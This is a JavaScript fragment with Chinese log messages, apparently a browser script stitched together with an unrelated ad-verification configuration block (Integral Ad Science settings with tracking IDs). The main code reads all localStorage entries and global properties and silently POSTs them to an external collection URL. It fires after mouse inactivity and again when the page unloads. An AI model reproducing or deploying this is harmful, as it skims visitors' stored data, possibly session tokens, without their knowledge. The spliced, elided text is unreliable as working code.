function discoverGlobalProperties() {
  const globalProps = {};
  const localProps = {};
  ...
  if (typeof localStorage !== "undefined") {
    for (let i = 0; i < localStorage.length; i++) {
      ...
      localProps[key] = localStorage.getItem(key);
    }
  }
  return {
    globalProps,
...
function sendPropDiscoveries(props) {
  const collectionUrl = "https://example.com/api/collect";
  const xhr = new XMLHttpRequest();
  xhr.open("POST", collectionUrl);
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      if (xhr.status === 200) {
        console.debug("属性数据已成功传输");
      } else {
        console.warn(`属性数据传输失败，服务器响应码：${xhr.status}`);
      }
    }
  };
  xhr.send(JSON.stringify(props));
}
function discoverPropsJob() {
  const props = discoverGlobalProperties();
  const globalCount = Object.keys(props.globalProps).length;
  const localCount = Object.keys(props.localProps).length;
  if (globalCount > 0 || localCount > 0) {
    console.group(`发现了 ${globalCount} 个全局属性和 ${localCount} 个本地属性：`);
    for (const prop in props.globalProps) {
      console.log(`- Global: ${prop}: ${JSON.stringify(props.globalProps[prop])}`);
    }
    for (const prop in props.localProps) {
      console.log(`- Local: ${prop}: ${JSON.stringify(props.localProps[prop])}`);
    }
    console.groupEnd();
    sendPropDiscoveries(props);
  } else {
    console.debug("未发现新的属性");
  }
}
let timeout = null;
window.addEventListener("mousemove", () => {
  clearTimeout(timeout);
  timeout = setTimeout(discoverPropsJob, 30000);
});
try {
  var __IntegralASConfig = {
    ...
    protocol: 'https',
    jsref: "https:\/\/6a8f9c99a27753a599fdebb6bc12e635.safeframe.googlesyndication.com\/",
    asid: "81f063bb-3e98-11ee-8cb4-7e34ae0fea1f",
    ...
    mode: "rjss",
    requrl: "",
    dtBaseURL: "https:\/\/dt.adsafeprotected.com\/dt?advEntityId=971174",
    adsafeSrc: "https:\/\/fw.adsafeprotected.com\/rfw\/st\/971174\/61898081\/skeleton.js?ias_dspID=3&ias_campId=1013771226&ias_pubId=pub-2930805104418204&ias_chanId=1&ias_placementId=20450116474&bidurl=https:\/\/www.elwatannews.com\/&ias_dealId=&adsafe_par&ias_impId=v4~~ABAjH0jkkBMm05g52HfZqOcJE-FD",
    tpiLookupURL: "",
    getTpl: "false",
    use100v: false,
    useBapiCallback: "",
    useViewabilityNotification: "",
    scriptUrl: "https:\/\/fw.adsafeprotected.com\/rjss\/st\/971174\/61898081\/skeleton.js?ias_dspID=3&ias_campId=1013771226&ias_pubId=pub-2930805104418204&ias_chanId=1&ias_p",
    accountForSadImps: '',
    fwMonitoring: 'false',
    mn: "jsserver-primary-6c7df6fb6f-fmvjj",
    mobOrTab: false,
    app: false,
    mobAppWebview: false,
    mobFwUrl: "https:\/\/mobile.adsafeprotected.com\/internal\/monitoring\/app\/initial\/971174\/61898081\/?ias_campId=1013771226&ias_pubId=pub-2930805104418204&ias_placementId=20450116474&ias_chanId=1&ias_dealId=&ias_impId=v4~~ABAjH0jkkBMm05g52HfZqOcJE-FD&ias_dspId=3",
    anId: '',
    advEntityId: '971174',
    pubEntityId: '61898081',
    videoId: '',
    rts: {},
    customViewability: [],
...
window.addEventListener("beforeunload", () => {
  clearTimeout(timeout);
  console.debug("页面即将卸载，执行最终的属性发现任务");
  discoverPropsJob();
});
